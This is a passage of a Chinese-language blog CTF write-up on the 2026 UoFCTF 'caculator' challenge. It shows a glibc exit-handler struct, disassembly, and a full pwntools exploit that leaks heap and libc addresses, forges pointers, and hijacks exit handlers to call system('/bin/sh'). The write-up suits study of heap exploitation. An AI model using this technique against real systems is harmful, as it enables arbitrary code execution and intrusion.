+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* `flavour&#x27; should be of type of the `enum&#x27; above but since we need</span></span><br><span class="line"><span class="comment">       this element in an atomic operation we have to use `long int&#x27;.  */</span></span><br><span class="line">    <span class="type">long</span> <span class="type">int</span> flavor;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line">	<span class="type">void</span> (*at) (<span class="type">void</span>);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">	  &#123;</span></span><br><span class="line">	    <span class="type">void</span> (*fn) (<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line">	    <span class="type">void</span> *arg;</span><br><span class="line">	  &#125; on;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">	  &#123;</span></span><br><span class="line">	    <span class="type">void</span> (*fn) (<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line">	    <span class="type">void</span> *arg;</span><br><span class="line">	    <span class="type">void</span> *dso_handle;</span><br><span class="line">	  &#125; cxa;</span><br><span class="line">      &#125; func;</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>
+
+<p>這部分就是 assembly 那段 exit 的部分，rax 會指向 initial，最後解密 pointer 後去跳對應 function</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0x76af98294240 &lt;__run_exit_handlers+448&gt;:    mov    rcx,QWORD PTR [rax+0x18]</span><br><span class="line">0x76af98294244 &lt;__run_exit_handlers+452&gt;:    mov    r8,QWORD PTR [rax+0x20]</span><br><span class="line">0x76af98294248 &lt;__run_exit_handlers+456&gt;:    mov    QWORD PTR [rax+0x10],0x0</span><br><span class="line">0x76af98294250 &lt;__run_exit_handlers+464&gt;:    mov    rax,rcx</span><br><span class="line">0x76af98294253 &lt;__run_exit_handlers+467&gt;:    xor    ecx,ecx</span><br><span class="line">0x76af98294255 &lt;__run_exit_handlers+469&gt;:    ror    rax,0x11</span><br><span class="line">0x76af98294259 &lt;__run_exit_handlers+473&gt;:    xor    rax,QWORD PTR fs:0x30</span><br><span class="line">0x76af98294262 &lt;__run_exit_handlers+482&gt;:    xchg   DWORD PTR [rbx],ecx</span><br><span class="line">0x76af98294264 &lt;__run_exit_handlers+484&gt;:    cmp    ecx,0x1</span><br><span class="line">0x76af98294267 &lt;__run_exit_handlers+487&gt;:    jg     0x76af98294290 &lt;__run_exit_handlers+528&gt;</span><br><span class="line">0x76af98294269 &lt;__run_exit_handlers+489&gt;:    mov    rdi,r8</span><br><span class="line">0x76af9829426c &lt;__run_exit_handlers+492&gt;:    mov    esi,r13d</span><br><span class="line">0x76af9829426f &lt;__run_exit_handlers+495&gt;:    call   rax</span><br></pre></td></tr></table></figure>
+
+<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.sendline(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendlineafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recv(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcl</span>(): <span class="keyword">return</span> r.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcls</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recvlines(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcu</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.recvuntil(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ita</span>(): <span class="keyword">return</span> r.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cl</span>(): <span class="keyword">return</span> r.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tsl</span>(): <span class="keyword">return</span> time.sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p</span>(<span class="params">r</span>):</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p_c</span>(<span class="params">r,cmd</span>):</span><br><span class="line">    gdb.attach(r,cmd)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">split_nc</span>(<span class="params">nc_str</span>):</span><br><span class="line">    nc_str=nc_str.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> [nc_str[<span class="number">1</span>],nc_str[<span class="number">2</span>]]</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">REMOTE_LOCAL=<span class="built_in">input</span>(<span class="string">&quot;local?(y/n):&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> REMOTE_LOCAL==<span class="string">&quot;y&quot;</span>:</span><br><span class="line">    r=process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">    a=<span class="built_in">input</span>(<span class="string">&#x27;open debug?(y/n/srop)&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> a==<span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">        <span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">        context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> a==<span class="string">&#x27;srop&#x27;</span>:</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>, <span class="string">&#x27;-F&#x27;</span> <span class="string">&#x27;#&#123;pane_pid&#125;&#x27;</span>, <span class="string">&#x27;-P&#x27;</span>]</span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>:                                           </span><br><span class="line">    REMOTE_INFO=split_nc(<span class="string">&quot;nc naup.com 2000&quot;</span>)</span><br><span class="line"></span><br><span class="line">    REMOTE_IP=REMOTE_INFO[<span class="number">0</span>]</span><br><span class="line">    REMOTE_PORT=<span class="built_in">int</span>(REMOTE_INFO[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    r=remote(REMOTE_IP,REMOTE_PORT)</span><br><span class="line"></span><br><span class="line"><span class="comment">### attach</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">input</span>(<span class="string">&#x27;attach?(y/n)&#x27;</span>) == <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">    p(r)</span><br><span class="line"></span><br><span class="line"><span class="comment">### exploit</span></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;Enter expression (or quit): &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;Enter expression (or quit): &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;Enter expression (or quit): &#x27;</span>,<span class="string">b&#x27;1+2+1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Result = &#x27;</span>)</span><br><span class="line">leakheap = <span class="built_in">int</span>(r.recvline().strip()) % (<span class="number">1</span> &lt;&lt; <span class="number">128</span>) &amp; <span class="number">0xffffffffffffffff</span></span><br><span class="line">heapbase = (leakheap &lt;&lt; <span class="number">12</span>) - <span class="number">0x15000</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[!] leakheap:&quot;</span>, <span class="built_in">hex</span>(leakheap))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[!] heapbase:&quot;</span>, <span class="built_in">hex</span>(heapbase))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;Enter expression (or quit): &#x27;</span>,<span class="string">b&#x27;reset&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;Enter expression (or quit): &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;Enter expression (or quit): &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">124</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Enter expression (or quit): &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;Enter expression (or quit): &#x27;</span>,<span class="string">b&#x27;1+2+1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Result = &#x27;</span>)</span><br><span class="line">leaklibc = <span class="built_in">int</span>(r.recvline().strip()) % (<span class="number">1</span> &lt;&lt; <span class="number">128</span>) &amp; <span class="number">0xffffffffffffffff</span></span><br><span class="line">libcbase = leaklibc - <span class="number">0x210b23</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[!] leaklibc:&quot;</span>, <span class="built_in">hex</span>(leaklibc))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[!] libcbase:&quot;</span>, <span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;Enter expression (or quit): &#x27;</span>,<span class="string">b&#x27;reset&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;Enter expression (or quit): &#x27;</span>,<span class="string">b&#x27;2&#x27;</span> * <span class="number">0xc0</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;Enter expression (or quit): &#x27;</span>,<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;Enter expression (or quit): &#x27;</span>,<span class="string">b&#x27;reset&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;Enter expression (or quit): &#x27;</span>,<span class="string">b&#x27;2&#x27;</span> * <span class="number">0xb0</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;Enter expression (or quit): &#x27;</span>,<span class="string">b&#x27;reset&#x27;</span>)</span><br><span class="line"></span><br><span class="line">chunk_addr = heapbase + <span class="number">0x12880</span></span><br><span class="line">IO_list_all = libcbase + <span class="number">0x2114c0</span></span><br><span class="line">main_arena = heapbase + <span class="number">0xe0</span></span><br><span class="line">encrypt_ptr = (chunk_addr &gt;&gt; <span class="number">12</span>) ^ (main_arena)</span><br><span class="line"></span><br><span class="line">num1 = <span class="built_in">str</span>(encrypt_ptr).encode()</span><br><span class="line">num2 = <span class="built_in">str</span>(<span class="number">0x0</span>).encode()</span><br><span class="line"></span><br><span class="line">num_expr =  <span class="string">b&quot;0&quot;</span> * <span class="number">0x10</span> + num1 + <span class="string">b&#x27;+0&#x27;</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;Enter expression (or quit): &#x27;</span>, num_expr)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[!] encrypt_ptr:&quot;</span>, <span class="built_in">hex</span>(encrypt_ptr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[!] writable:&quot;</span>, <span class="built_in">hex</span>(IO_list_all))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[!] main_arena:&quot;</span>, <span class="built_in">hex</span>(main_arena))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;Enter expression (or quit): &#x27;</span>,<span class="string">b&#x27;1&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">control_flow = libcbase + <span class="number">0x4d20e0</span> + <span class="number">0x40</span></span><br><span class="line">fs_base = libcbase - <span class="number">0xfb850</span></span><br><span class="line">initial = libcbase + <span class="number">0x2120f0</span></span><br><span class="line">libc_system = libcbase + <span class="number">0x5c110</span></span><br><span class="line">libc_bin_sh = libcbase + <span class="number">0x1d84ab</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[!] fs_base:&quot;</span>, <span class="built_in">hex</span>(fs_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[!] initial:&quot;</span>, <span class="built_in">hex</span>(initial))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;Enter expression (or quit): &#x27;</span>, p64(fs_base) + p64(initial))</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;Enter expression (or quit): &#x27;</span>, <span class="string">b&quot;\x00&quot;</span> * <span class="number">0xb0</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;Enter expression (or quit): &#x27;</span>, p64(<span class="number">0x4</span>) + p64(libc_system &lt;&lt; <span class="number">0x11</span>) + p64(libc_bin_sh)+ <span class="string">b&quot;a&quot;</span> * (<span class="number">0xc0</span> - <span class="number">0x18</span>))</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;Enter expression (or quit): &#x27;</span>,<span class="string">b&#x27;quit&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### interactive</span></span><br><span class="line">ita()</span><br></pre></td></tr></table></figure>
+
+<h2 id="ref"><a href="#ref" class="headerlink" title="ref"></a>ref</h2><p><a target="_blank" rel="noopener" href="https://www.kn0sky.com/?p=d400e21d-6a46-4fa0-bce8-81a5a7328c83">https://www.kn0sky.com/?p=d400e21d-6a46-4fa0-bce8-81a5a7328c83</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        <img data-src="/images/posts_cover/csc/csc20.png" data-sizes="auto" alt="金盾獎 20th - record" class="lazyload">
+      
+      <a href="/2026/01/09/csc-20th-record/"></a>
+      <div class="article-nav-caption">Older</div>
+      <h3 class="article-nav-title">
+        
+          金盾獎 20th - record
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2026
+      <span class="footer-info-sep rotate"></span>
+      Naup堇姬
+    </div>
+    
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        217.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        18:57
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2026-UoFCTF-caculator"><span class="toc-number">1.</span> <span class="toc-text">2026 UoFCTF - caculator</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Analyze-source-code"><span class="toc-number">1.2.</span> <span class="toc-text">Analyze source code</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#challenge"><span class="toc-number">1.3.</span> <span class="toc-text">challenge</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exploit"><span class="toc-number">1.4.</span> <span class="toc-text">exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ref"><span class="toc-number">1.5.</span> <span class="toc-text">ref</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Naup堇姬" class="lazyload">
+  <div class="sidebar-author-name">Naup堇姬</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">89</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">21</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-email sidebar-social-icon">
+      <a href=naup96721@gmail.com itemprop="url" target="_blank" aria-label="email" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/Naupjjin itemprop="url" target="_blank" aria-label="github" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "Naup堇姬",
+          title: "2026 UoFCTF - caculator",
+          url: "http://example.com/2026/02/12/2026-UoFCTF-caculator/",
+          excerpt: "",
+          description: "",
+          stripContent: "2026 UoFCTF - caculator Author: 堇姬 Naup  前言前幾天 @consolebreak 跑來問我這題，看了一下好像蠻有趣的就來寫了一下，沒想到我就這樣卡住了兩天，最後還是解出來了，其中主要卡在最後拿到任意寫後，unordered map 內的 std::string 拿到了非法位置的 pointer，最後解構要去釋放時候會觸發 glibc 檢查導致 crash，以至於沒辦法打 IO_FILE，如果有人知道怎麼打 IO_FILE 在這題可以私訊我XD總之好玩，最後",
+          date: "Thu Feb 12 2026 12:42:34 GMT+0800",
+          updated: "Thu Feb 12 2026 12:43:05 GMT+0800",
+          cover: "https://i.postimg.cc/bJwcgqPx/131939316-p0.jpg",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+  </body>
+  </html>
+
